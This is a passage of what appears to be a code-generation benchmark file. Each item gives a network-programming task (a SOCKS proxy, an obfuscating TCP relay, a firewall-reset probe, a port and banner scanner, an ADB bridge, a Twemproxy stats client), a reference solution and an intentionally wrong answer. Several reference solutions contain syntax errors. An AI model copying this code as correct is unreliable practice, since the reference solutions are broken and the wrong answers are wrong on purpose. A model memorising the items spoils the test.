    "wrong_result": "import socket\n\nclass socksocket(socket.socket):\n    default_proxy = (None, None, None, False, None, None)\n\n    def __init__(self, family, type, proto, *args, **kwargs):\n        super().__init__(family, type, proto, *args, **kwargs)\n        self.proxy = self.default_proxy\n        self._proxyconn = None\n        self.proxy_sockname = None\n        self.proxy_peername = None\n        self._timeout = 30.0\n\n    def set_proxy(self, proxy_type, addr, port, rdns, username, password):\n        self.proxy = (proxy_type, addr, port, rdns, username, password)\n\n    def connect(self, dest_pair):\n        if self.proxy[0] is not None:\n            dest_addr, dest_port = dest_pair\n            if self.proxy[0] == 'SOCKS4':\n                self._negotiate_SOCKS4(dest_addr, dest_port)\n            elif self.proxy[0] == 'SOCKS5':\n                self._negotiate_SOCKS5(dest_addr, dest_port)\n            elif self.proxy[0] == 'HTTP':\n                self._negotiate_HTTP(dest_addr, dest_port)\n            else:\n                raise ValueError(\"Unsupported proxy type\")\n        else:\n            super().connect(dest_pair)\n\n    def _readall(self, file, count):\n        data = b''\n        while len(data) < count:\n            buf = file.read(count - len(data))\n            if not buf:\n                break\n            data += buf\n        return data\n\n    def _proxy_addr(self):\n        addr, port = self.proxy[1], self.proxy[2]\n        if isinstance(addr, str):\n            return socket.gethostbyname(addr), port\n        else:\n            return addr, port\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        proxy_addr, proxy_port = self._proxy_addr()\n        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        proxy_socket.settimeout(self._timeout)\n        proxy_socket.connect((proxy_addr, proxy_port))\n        ip_bytes = socket.inet_aton(dest_addr)\n        port_bytes = dest_port.to_bytes(2, 'big')\n        request = b'\\x04\\x01' + ip_bytes + port_bytes + b'\\x00'\n        proxy_socket.send(request)\n        response = proxy_socket.recv(8)\n        if response[0] != 0x00:\n            raise ConnectionError(\"SOCKS4 negotiation failed\")\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        proxy_addr, proxy_port = self._proxy_addr()\n        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        proxy_socket.settimeout(self._timeout)\n        proxy_socket.connect((proxy_addr, proxy_port))\n        proxy_socket.send(b'\\x05\\x00\\x00')\n        response = proxy_socket.recv(2)\n        if response[0] != 0x05:\n            raise ConnectionError(\"SOCKS5 handshake failed\")\n        ip_bytes = socket.inet_aton(dest_addr)\n        port_bytes = dest_port.to_bytes(2, 'big')\n        request = b'\\x05\\x01\\x00\\x01' + ip_bytes + port_bytes\n        proxy_socket.send(request)\n        response = proxy_socket.recv(2)\n        if response[0] != 0x00:\n            raise ConnectionError(\"SOCKS5 negotiation failed\")\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        proxy_addr, proxy_port = self._proxy_addr()\n        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        proxy_socket.settimeout(self._timeout)\n        proxy_socket.connect((proxy_addr, proxy_port))\n        request = f\"CONNECT {dest_addr}:{dest_port} HTTP/1.1\\r\\nHost: {dest_addr}\\r\\n\\r\\n\".encode()\n        proxy_socket.send(request)\n        response = proxy_socket.recv(1024)\n        if not response.startswith(b'HTTP/1.1 200'):\n            raise ConnectionError(\"HTTP negotiation failed\")"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local socket and a remote socket, handling encryption, obfuscation, and protocol-specific operations.\n\nClass Description: The TCPRelayHandler class is responsible for managing the bidirectional communication between a local client and a remote server. It handles socket creation, connection establishment, data encryption/decryption, obfuscation, and protocol-specific operations. The class uses event-driven programming to manage socket events efficiently.\n\nAttributes:\n\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to their handler instances\n- _loop: [object] - Event loop instance for managing socket events\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating if this is a local handler\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption/decryption handler\n- _client_address: [tuple] - Client address (IP, port)\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _local_sock_fd: [int] - Local socket file descriptor\n- _remote_sock_fd: [int] - Remote socket file descriptor\n- _remote_address: [tuple] - Remote server address (IP, port)\n- _data_to_write_to_remote: [list] - Buffer for data to be sent to remote\n\nMethods:\n\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> [None] - Initializes the handler with server references, sockets, and configuration\n- _create_remote_socket(ip, port) -> [socket.socket] - Creates and configures a remote socket\n- _handle_dns_resolved(result, error) -> [None] - Handles DNS resolution result\n- _write_to_sock(data, sock) -> [bytes/None] - Writes data to specified socket\n- _on_local_read() -> [None] - Handles incoming data from local socket\n- _on_remote_read() -> [None] - Handles incoming data from remote socket\n- _on_remote_write() -> [None] - Handles write events for remote socket\n- handle_event(sock, fd, event) -> [bool] - Processes socket events\n- destroy() -> [None] - Cleans up resources and closes sockets",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport common\nimport obfs\nimport encrypt\nimport eventloop\nimport lru_cache\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._create_encryptor(config)\n        self._client_address = local_sock.getpeername()[:2]\n        self._update_tcp_mss(local_sock)\n        self._obfs = obfs.obfs(config['obfs'])\n        self._protocol = obfs.obfs(config['protocol'])\n        self._setup_server_info()\n        local_sock.setblocking(False)\n        self._local_sock_fd = local_sock.fileno()\n        fd_to_handlers[self._local_sock_fd] = self\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n\n    def _create_remote_socket(self, ip, port):\n        addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        remote_sock = socket.socket(af, socktype, proto)\n        remote_sock.setblocking(False)\n        remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        self._remote_sock = remote_sock\n        self._remote_sock_fd = remote_sock.fileno()\n        self._fd_to_handlers[self._remote_sock_fd] = self\n        return remote_sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            self.destroy()\n            return\n        if result:\n            ip = result[1]\n            if ip:\n                try:\n                    remote_sock = self._create_remote_socket(ip, self._remote_address[1])\n                    remote_sock.connect((ip, self._remote_address[1]))\n                    self._loop.add(remote_sock, eventloop.POLL_ERR | eventloop.POLL_OUT, self._server)\n                    self._stage = STAGE_CONNECTING\n                except Exception as e:\n                    self.destroy()\n\n    def _write_to_sock(self, data, sock):\n        try:\n            if sock == self._remote_sock:\n                self._update_activity(len(data))\n                sent = sock.send(data)\n                if sent < len(data):\n                    return data[sent:]\n            return None\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                self.destroy()\n            return data\n\n    def _on_local_read(self):\n        try:\n            data = self._local_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                if self._encryptor is not None:\n                    data = self._protocol.client_pre_encrypt(data)\n                    data = self._encryptor.encrypt(data)\n                    data = self._obfs.client_encode(data)\n            self._write_to_sock(data, self._remote_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_read(self):\n        try:\n            data = self._remote_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                obfs_decode = self._obfs.client_decode(data)\n                data = self._encryptor.decrypt(obfs_decode[0])\n                data = self._protocol.client_post_decrypt(data)\n            self._write_to_sock(data, self._local_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_write(self):\n        self._stage = STAGE_STREAM\n        if self._data_to_write_to_remote:\n            data = b''.join(self._data_to_write_to_remote)\n            self._data_to_write_to_remote = []\n            remaining = self._write_to_sock(data, self._remote_sock)\n            if remaining is not None:\n                self._data_to_write_to_remote.append(remaining)\n\n    def handle_event(self, sock, fd, event):\n        if fd == self._remote_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_remote_read()\n            elif event & eventloop.POLL_OUT:\n                self._on_remote_write()\n        elif fd == self._local_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_local_read()\n        return True\n\n    def destroy(self):\n        if self._remote_sock:\n            self._loop.removefd(self._remote_sock_fd)\n            del self._fd_to_handlers[self._remote_sock_fd]\n            self._remote_sock.close()\n        if self._local_sock:\n            self._loop.removefd(self._local_sock_fd)\n            del self._fd_to_handlers[self._local_sock_fd]\n            self._local_sock.close()\n        self._server.remove_handler(self)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "class TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = 0\n        self._data_to_write_to_remote = []\n        self._encryptor = None\n        self._obfs = None\n        self._protocol = None\n        self._local_sock_fd = local_sock.fileno()\n        self._remote_sock_fd = -1\n        self._client_address = local_sock.getpeername()\n        self._remote_address = None\n\n    def _create_remote_socket(self, ip, port):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setblocking(False)\n        sock.connect((ip, port))\n        return sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            self.destroy()\n        else:\n            self._remote_sock = self._create_remote_socket(result[0], result[1])\n            self._loop.add_reader(self._remote_sock.fileno(), self._on_remote_read)\n            self._remote_address = result\n\n    def _write_to_sock(self, data, sock):\n        try:\n            return sock.send(data)\n        except Exception:\n            return None\n\n    def _on_local_read(self):\n        data = self._local_sock.recv(4096)\n        if data:\n            decrypted = self._encryptor.decrypt(data)\n            obfuscated = self._obfs.obfuscate(decrypted)\n            processed = self._protocol.process(obfuscated)\n            self._data_to_write_to_remote.append(processed)\n\n    def _on_remote_read(self):\n        data = self._remote_sock.recv(4096)\n        if data:\n            decrypted = self._encryptor.decrypt(data)\n            obfuscated = self._obfs.obfuscate(decrypted)\n            processed = self._protocol.process(obfuscated)\n            self._write_to_sock(processed, self._local_sock)\n\n    def _on_remote_write(self):\n        if self._data_to_write_to_remote:\n            data = self._data_to_write_to_remote.pop(0)\n            bytes_sent = self._write_to_sock(data, self._remote_sock)\n            if bytes_sent < len(data):\n                self._data_to_write_to_remote.insert(0, data[bytes_sent:])\n            else:\n                self._loop.add_writer(self._remote_sock.fileno(), self._on_remote_write)\n\n    def handle_event(self, sock, fd, event):\n        if event & selectors.EVENT_READ:\n            if sock is self._local_sock:\n                self._on_local_read()\n            elif sock is self._remote_sock:\n                self._on_remote_read()\n        elif event & selectors.EVENT_WRITE:\n            if sock is self._remote_sock:\n                self._on_remote_write()\n        return True\n\n    def destroy(self):\n        if self._local_sock:\n            self._local_sock.close()\n        if self._remote_sock:\n            self._remote_sock.close()\n        self._server.remove_handler(self._fd_to_handlers[self._local_sock_fd])\n        del self._fd_to_handlers[self._local_sock_fd]"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a function to probe an HTTP server's connectivity and response behavior, checking for potential network interference or server availability issues.\n\nFunction Description: The function attempts to connect to an HTTP server, send a GET request with a specific keyword, and analyze the response. It also checks Redis for potential firewall interference patterns. The function returns different status codes based on the server's response and network conditions.\n\nInput:\n- domain: [str] - The domain name of the target server\n- ip: [str] - The IP address of the target server\n- keyword: [str] - The search keyword to include in the GET request\n\nOutput:\n- [int] - Returns one of the following status codes:\n  * RET_SUCCESS (1) if server responds normally\n  * RET_SVR_NO_RESP (2) if server doesn't respond or times out\n  * RET_GFW_RST (3) if firewall interference is detected\n  * RET_OTHER (99) for other unexpected errors",
    "Canonical_solution": "import os\nimport socket\nimport errno\nimport time\nimport redis\nimport struct\n\nRET_SUCCESS = 1\nRET_SVR_NO_RESP = 2\nRET_GFW_RST = 3\nRET_OTHER = 99\n\ndef probe_http_server(domain, ip, keyword):\n    redis_conn = redis.StrictRedis(host='localhost', port=6389, db=0)\n\n    ret = 0\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((ip, 80))\n        s.sendall(\"GET /?keyword=%s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\nUser-Agent: connectivity measurement\\r\\n\\r\\n\" % (keyword, domain))\n        data = s.recv(1024)\n        s.shutdown(socket.SHUT_RDWR)\n        s.close()\n        if data and len(data) > 1:\n            ret = 1\n    except socket.timeout:\n        ret = 0\n    except socket.error, serr:\n        if serr[0] == errno.ECONNRESET:\n            ret = -1\n        elif serr[0] == errno.ETIMEDOUT:\n            ret = 0\n        else:\n            ret = -99\n    except Exception, err:\n        ret = -99\n\n    time.sleep(2)\n    type1rst = redis_conn.keys(\"rst:attack1:*_%d\" % ip2int(ip))\n    type2rst = redis_conn.keys(\"rst:attack2:*_%d\" % ip2int(ip))\n    if type1rst or type2rst:\n        return RET_GFW_RST\n    else:\n        if ret == -1:\n            return RET_SVR_NO_RESP\n        elif ret == 0:\n            return RET_SVR_NO_RESP\n        elif ret == 1:\n            return RET_SUCCESS\n        else:\n            return RET_OTHER\n\ndef ip2int(addr):                                                               \n    return struct.unpack(\"I\", socket.inet_aton(addr))[0]",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import requests\nimport redis\nfrom urllib.parse import quote\n\ndef probe_server(domain, ip, keyword):\n    try:\n        # Construct URL with keyword\n        url = f\"http://{domain}/?keyword={quote(keyword)}\"\n        response = requests.get(url, timeout=5)\n        if response.status_code == 200:\n            # Check Redis for firewall interference\n            r = redis.Redis(host=ip, port=6379, db=0)\n            try:\n                # Example pattern check (hypothetical)\n                if r.exists(f\"firewall:{ip}\"):\n                    return 3\n                return 1\n            except Exception:\n                return 2\n        return 99\n    except Exception:\n        return 2"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the SambaVerse API, handling request construction, response processing, and error management.\n\nClass Description: The SambaVerseClient class provides an interface to communicate with the SambaVerse API, sending chat messages and receiving completions. It handles API authentication, request formatting, and response conversion.\n\nAttributes:\n_api_key: str - The API key for authentication with the SambaVerse service\nmodel_type: str - The model type/name to be used for completions\n_url: str - The endpoint URL for the SambaVerse API\nmodel_config_dict: Dict[str, Any] - Configuration parameters for the model (temperature, max_tokens, etc.)\n\nMethods:\n__init__(api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None - Initializes the client with API credentials and configuration\nsend_request(messages: List[OpenAIMessage]) -> ChatCompletion - Sends a chat completion request to the API and returns the processed response\n_convert_response(samba_response: Dict[str, Any]) -> ChatCompletion - Converts the raw API response into a standardized ChatCompletion object",
    "Canonical_solution": "import json\nimport uuid\nfrom typing import Any, Dict, List, Optional, Union\n\nimport httpx\nfrom camel.messages import OpenAIMessage\nfrom camel.types import ChatCompletion, CompletionUsage\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]):\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"key\": str(self._api_key),\n            \"modelName\": self.model_type,\n        }\n\n        data = {\n            \"instance\": json.dumps({\n                \"conversation_id\": str(uuid.uuid4()),\n                \"messages\": messages,\n            }),\n            \"params\": {\n                \"do_sample\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"max_tokens_to_generate\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"max_tokens\")),\n                },\n                \"process_prompt\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"repetition_penalty\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"repetition_penalty\")),\n                },\n                \"return_token_count_only\": {\"type\": \"bool\", \"value\": \"false\"},\n                \"select_expert\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_type.split('/')[1],\n                },\n                \"stop_sequences\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_config_dict.get(\"stop_sequences\"),\n                },\n                \"temperature\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"temperature\")),\n                },\n                \"top_k\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"top_k\")),\n                },\n                \"top_p\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"top_p\")),\n                },\n            },\n        }\n\n        with httpx.Client() as client:\n            response = client.post(\n                self._url,\n                headers=headers,\n                json=data,\n            )\n\n        raw_text = response.text\n        dicts = raw_text.split('}\\n{')\n        last_dict = '{' + dicts[-1]\n        last_dict = json.loads(last_dict)\n        return self._convert_response(last_dict)\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        choices = [\n            dict(\n                index=0,\n                message={\n                    \"role\": 'assistant',\n                    \"content\": samba_response['result']['responses'][0]['completion'],\n                },\n                finish_reason=samba_response['result']['responses'][0]['stop_reason'],\n            )\n        ]\n\n        return ChatCompletion.construct(\n            id=None,\n            choices=choices,\n            created=int(time.time()),\n            model=self.model_type,\n            object=\"chat.completion\",\n            usage=CompletionUsage(\n                completion_tokens=0,\n                prompt_tokens=0,\n                total_tokens=int(samba_response['result']['responses'][0]['total_tokens_count']),\n            ),\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "import requests\nfrom typing import List, Dict, Any\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None:\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        payload = {\n            \"messages\": messages,\n            \"model\": self.model_type,\n            \"config\": self.model_config_dict\n        }\n        headers = {\n            \"Authorization\": f\"Bearer {self._api_key}\"\n        }\n        try:\n            response = requests.post(self._url, json=payload, headers=headers)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            raise RuntimeError(f\"Error sending request: {e}\")\n        try:\n            samba_response = response.json()\n        except ValueError as e:\n            raise ValueError(f\"Invalid JSON response: {e}\") from e\n        return self._convert_response(samba_response)\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        choices = []\n        if 'choices' in samba_response:\n            for choice in samba_response['choices']:\n                choices.append(Choice(**choice))\n        return ChatCompletion(model=samba_response.get('model'), choices=choices)"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Create a function that scans a target host and port for open connections and service information using TCP socket communication.\n\nFunction Description: The function attempts to establish a TCP connection with a specified host and port, retrieves service information if available, and records the results in a global dictionary. It handles connection timeouts and errors gracefully.\n\nInput:\n- target (tuple): A tuple containing (host, port) where:\n  - host (str/int): The target hostname or IP address\n  - port (int): The target port number to scan\n\nOutput:\n- None: The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n    host: {\n      port: {\n        'protocol': str,    # Protocol from global ports dictionary\n        'service': str,    # Either received service data or default from ports dict\n        'state': str       # 'open' if connection succeeded\n      }\n    }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\nresults = {}\n\ndef scan_host_port(target):\n    global results\n    host, port = target\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(1)\n    try:\n        sock.connect((host, port))\n        state = 'open'\n        try:\n            service = socket.getservbyport(port, 'tcp')\n        except (OSError, KeyError):\n            service = str(port)\n        protocol = 'tcp'\n        if host not in results:\n            results[host] = {}\n        results[host][port] = {\n            'protocol': protocol,\n            'service': service,\n            'state': state\n        }\n    except (socket.timeout, socket.error) as e:\n        state = 'closed'\n        service = str(port)\n        protocol = 'tcp'\n        if host not in results:\n            results[host] = {}\n        results[host][port] = {\n            'protocol': protocol,\n            'service': service,\n            'state': state\n        }\n    finally:\n        sock.close()"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a TCP client class for communicating with an Android device through an ADB bridge, handling connection management, data transmission, and error recovery.\n\nClass Description: AdbConnector - A class that establishes and maintains a TCP connection to an Android device via ADB bridge, providing methods for sending requests and receiving responses.\n\nAttributes:\n- adb_host: str - The host address where ADB is running (default: 'localhost')\n- socket: socket - The TCP socket object for communication\n- packet_buffer: bytes - Buffer for storing incomplete packets\n- _disposed: bool - Flag indicating whether the connection has been closed\n- adb_proc: Popen - Subprocess object for the ADB bridge process\n\nMethods:\n- __init__(adb_host: str = 'localhost') -> None - Initializes the ADB connector with the specified host\n- _relaunch_adb_bridge() -> None - Restarts the ADB bridge connection when needed\n- send_request(packet_type: int, packet_payload: bytes) -> None - Sends a request packet to the device\n- read_loop() -> None - Continuously reads and processes incoming data from the device\n- dispose(disposing: bool = True) -> None - Cleans up resources and closes the connection",
    "Canonical_solution": "from subprocess import Popen, run, PIPE, DEVNULL, STDOUT, TimeoutExpired, list2cmdline\nfrom socket import socket, AF_INET, SOCK_STREAM\nfrom functools import partial\nfrom typing import Optional\nfrom os.path import exists\nfrom re import search\n\nQCSUPER_TCP_PORT = 43555\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost'):\n        self.adb_host = adb_host\n        self.socket = socket(AF_INET, SOCK_STREAM)\n        self.packet_buffer = b''\n        self._disposed = False\n\n    def _relaunch_adb_bridge(self):\n        if hasattr(self, 'adb_proc'):\n            self.adb_proc.terminate()\n        \n        run_safe([self.adb_exe, 'forward', 'tcp:' + str(QCSUPER_TCP_PORT), 'tcp:' + str(QCSUPER_TCP_PORT)], check = True,\n                stdout = DEVNULL, stdin = DEVNULL)\n        \n        self.adb_proc = Popen([self.adb_exe, 'exec-out' if self.can_use_exec_out else 'shell', self.su_command % (ANDROID_TMP_DIR + '/adb_bridge')],\n            stdin = DEVNULL, stdout = PIPE, stderr = STDOUT,\n            preexec_fn = (lambda: partial(drop_privileges, True)) if drop_privileges else None,\n            bufsize = 0, universal_newlines = True\n        )\n    \n        for line in self.adb_proc.stdout:\n            if 'Connection to Diag established' in line:\n                break\n            else:\n                warning('Unexpected adb_bridge output: ' + line)\n\n        self.socket = socket(AF_INET, SOCK_STREAM)\n\n        try:\n            self.socket.connect((self.adb_host, QCSUPER_TCP_PORT))\n        except Exception:\n            self.adb_proc.terminate()\n            error('Could not communicate with the adb_bridge through TCP')\n            exit()\n        \n        self.received_first_packet = False\n\n    def send_request(self, packet_type, packet_payload):\n        raw_payload = self.hdlc_encapsulate(bytes([packet_type]) + packet_payload\n        self.socket.send(raw_payload)\n\n    def read_loop(self):\n        while True:\n            while self.TRAILER_CHAR not in self.packet_buffer:\n                socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read and platform in ('cygwin', 'win32'):\n                    self._relaunch_adb_bridge()\n                    \n                    if not self.program_is_terminating:\n                        with self.shutdown_event:\n                            self.shutdown_event.notify()\n                    \n                    socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read:\n                    error('\\nThe connection to the adb bridge was closed, or ' +\n                        'preempted by another QCSuper instance')\n                    return\n                \n                self.packet_buffer += socket_read\n            \n            while self.TRAILER_CHAR in self.packet_buffer:\n                raw_payload, self.packet_buffer = self.packet_buffer.split(self.TRAILER_CHAR, 1)\n                \n                try:\n                    unframed_message = self.hdlc_decapsulate(\n                        payload = raw_payload + self.TRAILER_CHAR\n                    )\n                except self.InvalidFrameError:\n                    continue\n                finally:\n                    self.received_first_packet = True\n                \n                self.dispatch_received_diag_packet(unframed_message)\n\n    def dispose(self, disposing=True):\n        if not self._disposed:\n            if hasattr(self, 'adb_proc'):\n                self.adb_proc.terminate()\n            self._disposed = True",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport subprocess\nimport threading\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost'):\n        self.adb_host = adb_host\n        self.socket = None\n        self.packet_buffer = b''\n        self._disposed = False\n        self.adb_proc = None\n        self._start_connection()\n\n    def _relaunch_adb_bridge(self):\n        if self.adb_proc and self.adb_proc.poll() is None:\n            self.adb_proc.terminate()\n            self.adb_proc.wait()\n        self.adb_proc = subprocess.Popen(['adb', 'start-server'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n    def send_request(self, packet_type: int, packet_payload: bytes) -> None:\n        packet = packet_type.to_bytes(4, byteorder='big') + packet_payload\n        self.socket.sendall(packet)\n\n    def read_loop(self) -> None:\n        while not self._disposed:\n            try:\n                data = self.socket.recv(1024)\n                if not data:\n                    break\n                self.packet_buffer += data\n                self._process_packet_buffer()\n            except Exception:\n                break\n\n    def _process_packet_buffer(self):\n        if len(self.packet_buffer) < 4:\n            return\n        length = int.from_bytes(self.packet_buffer[:4], byteorder='big')\n        if length > len(self.packet_buffer) - 4:\n            return\n        payload = self.packet_buffer[4:4+length]\n        print(f\"Received packet: {payload}\")\n        self.packet_buffer = self.packet_buffer[4+length:]\n\n    def dispose(self, disposing: bool = True) -> None:\n        self._disposed = True\n        if self.socket:\n            self.socket.close()\n        if self.adb_proc and self.adb_proc.poll() is None:\n            self.adb_proc.terminate()\n            self.adb_proc.wait()\n\n    def _start_connection(self):\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        try:\n            self.socket.connect((self.adb_host, 5037))\n            threading.Thread(target=self.read_loop, daemon=True).start()\n        except ConnectionError:\n            self._relaunch_adb_bridge()\n            self._start_connection()"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Python class that collects and processes statistics from Twemproxy (a fast, lightweight proxy for memcached and Redis) using TCP socket communication.\n\nClass Description: TwemproxyStatsCollector is a class designed to connect to Twemproxy instances, retrieve statistics in JSON format, and process them into structured dictionaries for gauges and pool metrics.\n\nAttributes:\nGAUGES: [list] - A list of metric names that should be treated as gauge values (numeric values that can go up and down)\nIGNORED: [list] - A list of field names that should be ignored when processing the statistics\n\nMethods:\nget_raw_stats: [Name](host, port) -> [dict] - Establishes a TCP connection to the specified Twemproxy instance and retrieves raw statistics in JSON format\nget_stats: [Name](host, port) -> [tuple(dict, dict)] - Processes raw statistics into two dictionaries: one for general stats and one for pool/server metrics\ncollect_stats: [Name](hosts) -> [dict] - Collects statistics from multiple Twemproxy hosts and organizes them by alias/hostname",
    "Canonical_solution": "import socket\nimport json\nimport re\n\nclass TwemproxyStatsCollector:\n    GAUGES = [\n        'uptime',\n        'curr_connections',\n        'client_connections',\n        'server_connections',\n        'server_ejected_at',\n        'in_queue',\n        'in_queue_bytes',\n        'out_queue',\n        'out_queue_bytes'\n    ]\n\n    IGNORED = [\n        'service',\n        'source',\n        'timestamp',\n        'version'\n    ]\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n\n            stats_data = ''\n            while True:\n                data = sock.recv(1024)\n                if not data:\n                    break\n                stats_data += data\n            sock.close()\n\n        except socket.error:\n            raise Exception('Failed to get stats from %s:%s' % (host, port))\n\n        try:\n            return json.loads(stats_data)\n        except (TypeError, ValueError):\n            raise ValueError(\"Unable to parse response from Twemproxy as a json object\")\n\n    def get_stats(self, host, port):\n        data = self.get_raw_stats(host, port)\n        if data is None:\n            return {}, {}\n\n        stats = {}\n        pools = {}\n        for stat, value in data.iteritems():\n            if isinstance(value, dict):\n                pool_name = stat.replace('.', '_')\n                pools[pool_name] = {}\n                for pool_stat, pool_value in value.iteritems():\n                    if isinstance(pool_value, dict):\n                        server_name = 